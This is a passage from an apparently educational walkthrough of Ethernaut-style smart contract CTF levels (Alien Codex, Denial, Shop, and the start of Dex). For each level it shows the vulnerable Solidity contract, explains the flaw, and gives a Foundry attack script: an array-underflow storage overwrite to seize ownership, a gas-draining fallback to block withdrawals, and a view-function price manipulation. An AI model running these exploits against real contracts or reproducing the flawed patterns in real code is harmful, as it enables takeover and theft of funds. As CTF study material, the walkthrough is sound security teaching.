       <span class="nf">require</span><span class="p">(</span><span class="nx">_solver</span> <span class="o">!=</span> <span class="nf">address</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
       <span class="nx">magicNum</span><span class="p">.</span><span class="nf">setSolver</span><span class="p">(</span><span class="nx">_solver</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/MagicNumSolve.s.sol:MagicNumSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="19-alien-codex">19 Alien Codex</h1>

<p><code class="language-plaintext highlighter-rouge">AlienCodex.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.5</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span> 


<span class="k">import</span> <span class="dl">'</span><span class="s1">./helpers/Ownable-05.sol</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">AlienCodex</span> <span class="nx">is</span> <span class="nx">Ownable</span><span class="p">{</span>

  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">contact</span><span class="p">;</span>
  <span class="nx">bytes32</span><span class="p">[]</span> <span class="kr">public</span> <span class="nx">codex</span><span class="p">;</span>

  <span class="nx">modifier</span> <span class="nf">contacted</span><span class="p">()</span> <span class="p">{</span>
    <span class="nf">assert</span><span class="p">(</span><span class="nx">contact</span><span class="p">);</span>
    <span class="nx">_</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nf">makeContact</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">contact</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">record</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_content</span><span class="p">)</span> <span class="nx">contacted</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">codex</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">_content</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">retract</span><span class="p">()</span> <span class="nx">contacted</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">codex</span><span class="p">.</span><span class="nx">length</span><span class="o">--</span><span class="p">;</span>
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nf">revise</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">bytes32</span> <span class="nx">_content</span><span class="p">)</span> <span class="nx">contacted</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">codex</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">_content</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Ownable-05.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">contract</span> <span class="nx">Ownable</span> <span class="p">{</span>
    <span class="nx">address</span> <span class="kr">private</span> <span class="nx">_owner</span><span class="p">;</span>

    <span class="cm">/*
    Remaining code......
    */</span>
<span class="p">}</span>

</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Claim ownership to complete the level.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>First thing to note is the challenge contract uses pragma <code class="language-plaintext highlighter-rouge">0.5.0</code>, so it prone to integer overflow/underflows.</li>
  <li>To call any function on the contract we need to call the <code class="language-plaintext highlighter-rouge">makeContact()</code> function initially.</li>
  <li>Observe that <code class="language-plaintext highlighter-rouge">codex</code> is a dynamic bytes32 array. Recall how dynamic arrays stored in storage layout.</li>
  <li>AlineCodex inherits the Ownable contract which has the state variable <code class="language-plaintext highlighter-rouge">owner</code>. It will be stored at slot 0 combined with <code class="language-plaintext highlighter-rouge">contacted</code> variable.</li>
  <li>Here, in the slot 1 the legth of the <code class="language-plaintext highlighter-rouge">codex</code> array will be stored and it will be updated whenever a new element is pushed onto the array.</li>
  <li>AleinCodex also changes the length of the <code class="language-plaintext highlighter-rouge">codex</code> with <code class="language-plaintext highlighter-rouge">retract()</code> function.</li>
  <li><code class="language-plaintext highlighter-rouge">revise()</code> method allows us to modify any existing element of the <code class="language-plaintext highlighter-rouge">codex</code> array. Keep in mind that each element will stored at different storage slot.</li>
  <li>Initially the length of the <code class="language-plaintext highlighter-rouge">codex</code> is 0. If we call the <code class="language-plaintext highlighter-rouge">retract()</code> it will be <code class="language-plaintext highlighter-rouge">0 - 1</code> which results in underflow and stores the value <strong><code class="language-plaintext highlighter-rouge">2**256 - 1</code></strong> as the length . It is the maximum storage slot index of a contract in ethereum.</li>
  <li>So, now the codex array has access to all the storage slots of the contract. We can use this to update the <code class="language-plaintext highlighter-rouge">owner</code> value which is stored at the slot 0.</li>
  <li>For this we need to find the index of the slot 0. Dynamic arrays finds the elements starting from the slot number <code class="language-plaintext highlighter-rouge">uint(keccak256(SLOT_NUMBER_OF_LENGTH))</code>. So, the <code class="language-plaintext highlighter-rouge">codex</code> array elements starts from the slot <code class="language-plaintext highlighter-rouge">uint(keccak256(1))</code>.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> codex[0] ==&gt; codex[keccack256(1)]  ==&gt; slot keccack256(1)
 codex[1] ==&gt; codex[keccack256(1)+1]  ==&gt; slot keccack256(1)+1
</code></pre></div>    </div>
  </li>
  <li>We need to find the index of the slot 0. We can do this by pointing our <code class="language-plaintext highlighter-rouge">codex</code> array to <strong><code class="language-plaintext highlighter-rouge">2**256</code></strong> index, which is not available and result in an overflow and will points back to the slot 0.</li>
  <li>So, we need pass the <code class="language-plaintext highlighter-rouge">2**256 - keccack256(1)</code> to the <code class="language-plaintext highlighter-rouge">revise()</code> method it will find the index of the slot by using the same method
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> codex[keccack256(1) + 2**256 - keccack256(1)] 
 codex[2**256] ==&gt; slot 2**256 ==&gt; slot 0 (overflow)
</code></pre></div>    </div>
  </li>
  <li>This will result a overflow and <code class="language-plaintext highlighter-rouge">revise()</code> method will modify the content of the owner slot that is zero.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">AlienCodexSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span> 

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="c1">// import {AlienCodex} from "../src/AlienCodex.sol"; // Not using AlienCodex source contract because of old compiler dependency</span>

<span class="nx">contract</span> <span class="nx">AlienCodexSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">IAlienCodex</span> <span class="kr">public</span> <span class="nx">alienCodex</span> <span class="o">=</span> <span class="nc">IAlienCodex</span><span class="p">(</span><span class="mh">0x92FfB1bd2432d4F2EA1340209742a99FBbFD45d2</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">bytes32</span> <span class="nx">slot0</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">alienCodex</span><span class="p">),</span> <span class="nf">bytes32</span><span class="p">(</span><span class="nf">uint</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes32</span><span class="p">(</span><span class="nx">slot0</span><span class="p">);</span>  <span class="c1">// contacted + owner</span>

        <span class="nx">alienCodex</span><span class="p">.</span><span class="nf">makeContact</span><span class="p">();</span>

        <span class="nx">alienCodex</span><span class="p">.</span><span class="nf">retract</span><span class="p">();</span>  <span class="c1">// 0 - 1 ==&gt; (2**256) [underflow]</span>

        <span class="c1">// codex[0] ==&gt; codex[keccack256(1)]  ==&gt; slot keccack256(1)</span>
        <span class="c1">// codex[1] ==&gt; codex[keccack256(1)+1]  ==&gt; slot keccack256(1)+1</span>

        <span class="c1">// codex[2**256 - keccack256(1)]  ==&gt; codex[keccack256(1) + 2**256 - keccack256(1)] </span>
        <span class="c1">//                                ==&gt; codex[2**256] ==&gt; slot 2**256 ==&gt; slot 0 (overflow)</span>

        <span class="nx">uint</span> <span class="nx">ownerSlot</span> <span class="o">=</span> <span class="p">(((</span><span class="mi">2</span><span class="o">**</span><span class="mi">256</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="nf">uint</span><span class="p">(</span><span class="nf">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span> 
        <span class="c1">// uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;</span>
        <span class="nx">bytes32</span> <span class="nx">_content</span> <span class="o">=</span> <span class="nf">bytes32</span><span class="p">(</span><span class="nf">uint256</span><span class="p">(</span><span class="nf">uint160</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">MY_ADDRESS</span><span class="dl">"</span><span class="p">))));</span>
        <span class="nx">alienCodex</span><span class="p">.</span><span class="nf">revise</span><span class="p">(</span><span class="nx">ownerSlot</span><span class="p">,</span> <span class="nx">_content</span><span class="p">);</span>

        <span class="nx">bytes32</span> <span class="nx">slot0After</span> <span class="o">=</span> <span class="nx">vm</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="nx">alienCodex</span><span class="p">),</span> <span class="nf">bytes32</span><span class="p">(</span><span class="nf">uint</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">logBytes32</span><span class="p">(</span><span class="nx">slot0After</span><span class="p">);</span>  <span class="c1">// contacted + owner</span>

        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="kr">interface</span> <span class="nx">IAlienCodex</span> <span class="p">{</span>

  <span class="kd">function</span> <span class="nf">makeContact</span><span class="p">()</span> <span class="nx">external</span><span class="p">;</span>
  <span class="kd">function</span> <span class="nf">record</span><span class="p">(</span><span class="nx">bytes32</span> <span class="nx">_content</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>
  <span class="kd">function</span> <span class="nf">retract</span><span class="p">()</span> <span class="nx">external</span><span class="p">;</span>
  <span class="kd">function</span> <span class="nf">revise</span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">bytes32</span> <span class="nx">_content</span><span class="p">)</span> <span class="nx">external</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/AleinCodexSolve.s.sol:AleinCodexSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="20-denial">20 Denial</h1>

<p><code class="language-plaintext highlighter-rouge">Denial.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
<span class="nx">contract</span> <span class="nx">Denial</span> <span class="p">{</span>

    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">partner</span><span class="p">;</span> <span class="c1">// withdrawal partner - pay the gas, split the withdraw</span>
    <span class="nx">address</span> <span class="kr">public</span> <span class="nx">constant</span> <span class="nx">owner</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="mh">0xA9E</span><span class="p">);</span>
    <span class="nx">uint</span> <span class="nx">timeLastWithdrawn</span><span class="p">;</span>
    <span class="nf">mapping</span><span class="p">(</span><span class="nx">address</span> <span class="o">=&gt;</span> <span class="nx">uint</span><span class="p">)</span> <span class="nx">withdrawPartnerBalances</span><span class="p">;</span> <span class="c1">// keep track of partners balances</span>

    <span class="kd">function</span> <span class="nf">setWithdrawPartner</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_partner</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">partner</span> <span class="o">=</span> <span class="nx">_partner</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// withdraw 1% to recipient and 1% to owner</span>
    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">uint</span> <span class="nx">amountToSend</span> <span class="o">=</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
        <span class="c1">// perform a call without checking return</span>
        <span class="c1">// The recipient can revert, the owner will still get their share</span>
        <span class="nx">partner</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nl">value</span><span class="p">:</span><span class="nx">amountToSend</span><span class="p">}(</span><span class="dl">""</span><span class="p">);</span>
        <span class="nf">payable</span><span class="p">(</span><span class="nx">owner</span><span class="p">).</span><span class="nf">transfer</span><span class="p">(</span><span class="nx">amountToSend</span><span class="p">);</span>
        <span class="c1">// keep track of last withdrawal time</span>
        <span class="nx">timeLastWithdrawn</span> <span class="o">=</span> <span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">;</span>
        <span class="nx">withdrawPartnerBalances</span><span class="p">[</span><span class="nx">partner</span><span class="p">]</span> <span class="o">+=</span>  <span class="nx">amountToSend</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// allow deposit of funds</span>
    <span class="nf">receive</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span> <span class="p">{}</span>

    <span class="c1">// convenience function</span>
    <span class="kd">function</span> <span class="nf">contractBalance</span><span class="p">()</span> <span class="kr">public</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">balance</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>We should revert the call when the owner calls the <code class="language-plaintext highlighter-rouge">withdraw()</code> function. But if we do a simple revert in our contract fallback it won’t work.</li>
  <li>Because withdraw function doesn’t check for the return value.</li>
  <li>One thing we can do is, drain the gas of the transaction that is sent by the owner.</li>
  <li>Call to partner is made by the <code class="language-plaintext highlighter-rouge">call</code> which will forward all the remaining gas to the external call.</li>
  <li>So, we can drain all the gas by writing a most expensive computation in Partner contract.</li>
  <li>I have written an infinite loop inside the fallback of the Attack contract and registered the Attack contract as the partner in Denial contract.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">DenialSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Denial</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Denial.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">DenialSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Denial</span> <span class="kr">public</span> <span class="nx">denial</span> <span class="o">=</span> <span class="nc">Denial</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0x82091354dc7d529c2d52F4D99f7108630ECaE590</span><span class="p">));</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Denial Balance : </span><span class="dl">"</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="nx">denial</span><span class="p">).</span><span class="nx">balance</span><span class="p">);</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nf">exploit</span><span class="p">();</span>
        
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">Denial</span> <span class="kr">public</span> <span class="nx">denial</span> <span class="o">=</span> <span class="nc">Denial</span><span class="p">(</span><span class="nf">payable</span><span class="p">(</span><span class="mh">0x82091354dc7d529c2d52F4D99f7108630ECaE590</span><span class="p">));</span>
    <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">x</span><span class="p">;</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">denial</span><span class="p">.</span><span class="nf">setWithdrawPartner</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
        <span class="c1">// denial.withdraw();</span>
    <span class="p">}</span>
    <span class="nf">fallback</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">payable</span><span class="p">{</span>
        <span class="nf">for </span><span class="p">(</span><span class="nx">uint</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&gt;=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">){</span>
            <span class="nx">x</span> <span class="o">=</span> <span class="nx">x</span> <span class="o">+</span> <span class="nx">i</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/DenialSolve.s.sol:DenialSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="21-shop">21 Shop</h1>

<p><code class="language-plaintext highlighter-rouge">Shop.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="kr">interface</span> <span class="nx">Buyer</span> <span class="p">{</span>
  <span class="kd">function</span> <span class="nf">price</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Shop</span> <span class="p">{</span>
  <span class="nx">uint</span> <span class="kr">public</span> <span class="nx">price</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
  <span class="nx">bool</span> <span class="kr">public</span> <span class="nx">isSold</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nf">buy</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
    <span class="nx">Buyer</span> <span class="nx">_buyer</span> <span class="o">=</span> <span class="nc">Buyer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

    <span class="nf">if </span><span class="p">(</span><span class="nx">_buyer</span><span class="p">.</span><span class="nf">price</span><span class="p">()</span> <span class="o">&gt;=</span> <span class="nx">price</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">isSold</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">isSold</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="nx">price</span> <span class="o">=</span> <span class="nx">_buyer</span><span class="p">.</span><span class="nf">price</span><span class="p">();</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Goal</li>
</ul>

<ol>
  <li>Сan you get the item from the shop for less than the price asked?</li>
</ol>

<ul>
  <li>Solution</li>
</ul>

<ol>
  <li>This is similar to the Elevator challenge. Elevator uses a an external normal function to call.</li>
  <li>But here <code class="language-plaintext highlighter-rouge">price()</code> should a view function. Which shouldn’t modify the storage of the contract.</li>
  <li>So, we cant just keep the number of the calls to the <code class="language-plaintext highlighter-rouge">price()</code> function in our Attack contract.</li>
  <li>We can make use of <code class="language-plaintext highlighter-rouge">isSold</code> variable to check that the <code class="language-plaintext highlighter-rouge">price()</code> is called or not. This can be acceptable inside a view function.</li>
  <li>So, I wrote Attack contract with <code class="language-plaintext highlighter-rouge">price()</code> function defined as view and it returns two different price values for the initial call and second call.</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">ShopSolve.s.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/Script.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">forge-std/console.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="p">{</span><span class="nx">Shop</span><span class="p">}</span> <span class="k">from</span> <span class="dl">"</span><span class="s2">../src/Shop.sol</span><span class="dl">"</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">ShopSolve</span> <span class="nx">is</span> <span class="nx">Script</span><span class="p">{</span>
    <span class="nx">Shop</span> <span class="kr">public</span> <span class="nx">shop</span> <span class="o">=</span> <span class="nc">Shop</span><span class="p">(</span><span class="mh">0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="nx">external</span><span class="p">{</span>
        <span class="nx">vm</span><span class="p">.</span><span class="nf">startBroadcast</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nf">envUint</span><span class="p">(</span><span class="dl">"</span><span class="s2">PRIVATE_KEY</span><span class="dl">"</span><span class="p">));</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">is Sold : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">shop</span><span class="p">.</span><span class="nf">isSold</span><span class="p">());</span>

        <span class="k">new</span> <span class="nc">Attack</span><span class="p">().</span><span class="nf">exploit</span><span class="p">();</span>

        <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">is Sold : </span><span class="dl">"</span><span class="p">,</span> <span class="nx">shop</span><span class="p">.</span><span class="nf">isSold</span><span class="p">());</span>        
        <span class="nx">vm</span><span class="p">.</span><span class="nf">stopBroadcast</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span> <span class="nx">Attack</span><span class="p">{</span>
    <span class="nx">Shop</span> <span class="kr">public</span> <span class="nx">shop</span> <span class="o">=</span> <span class="nc">Shop</span><span class="p">(</span><span class="mh">0x45e7A13038eCA7cCfd53aC8C4F345A7bC2fCd2A2</span><span class="p">);</span>

    <span class="kd">function</span> <span class="nf">exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
        <span class="nx">shop</span><span class="p">.</span><span class="nf">buy</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="kd">function</span> <span class="nf">price</span><span class="p">()</span> <span class="nx">external</span> <span class="nx">view</span> <span class="nf">returns </span><span class="p">(</span><span class="nx">uint</span><span class="p">){</span>
        <span class="nf">if</span><span class="p">(</span><span class="nx">shop</span><span class="p">.</span><span class="nf">isSold</span><span class="p">()</span> <span class="o">==</span> <span class="kc">false</span><span class="p">){</span>
            <span class="k">return</span> <span class="mi">100</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>To run script :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">source</span> .env
<span class="nv">$ </span>forge script script/ShopSolve.s.sol:ShopSolve <span class="nt">--rpc-url</span> <span class="nv">$RPC_URL</span> <span class="nt">--broadcast</span>
</code></pre></div></div>

<h1 id="22-dex">22 Dex</h1>

<p><code class="language-plaintext highlighter-rouge">Dex.sol</code></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span> <span class="nx">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>

<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/IERC20.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">"</span><span class="s2">openzeppelin-contracts/contracts/token/ERC20/ERC20.sol</span><span class="dl">"</span><span class="p">;</span>
<span class="k">import</span> <span class="dl">'</span><span class="s1">openzeppelin-contracts/contracts/access/Ownable.sol</span><span class="dl">'</span><span class="p">;</span>

<span class="nx">contract</span> <span class="nx">Dex</span> <span class="nx">is</span> <span class="nc">Ownable</span><span class="p">(</span><span class="nf">address</span><span class="p">(</span><span class="mh">0x00</span><span class="p">))</span> <span class="p">{</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">token1</span><span class="p">;</span>
  <span class="nx">address</span> <span class="kr">public</span> <span class="nx">token2</span><span class="p">;</span>
  <span class="nf">constructor</span><span class="p">()</span> <span class="p">{}</span>

  <span class="kd">function</span> <span class="nf">setTokens</span><span class="p">(</span><span class="nx">address</span> <span class="nx">_token1</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">_token2</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nx">token1</span> <span class="o">=</span> <span class="nx">_token1</span><span class="p">;</span>
    <span class="nx">token2</span> <span class="o">=</span> <span class="nx">_token2</span><span class="p">;</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nf">addLiquidity</span><span class="p">(</span><span class="nx">address</span> <span class="nx">token_address</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="nx">onlyOwner</span> <span class="p">{</span>
    <span class="nc">IERC20</span><span class="p">(</span><span class="nx">token_address</span><span class="p">).</span><span class="nf">transferFrom</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span> <span class="nf">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="nx">amount</span><span class="p">);</span>
  <span class="p">}</span>
  
  <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span><span class="nx">address</span> <span class="k">from</span><span class="p">,</span> <span class="nx">address</span> <span class="nx">to</span><span class="p">,</span> <span class="nx">uint</span> <span class="nx">amount</span><span class="p">)</span> <span class="kr">public</span> <span class="p">{</span>
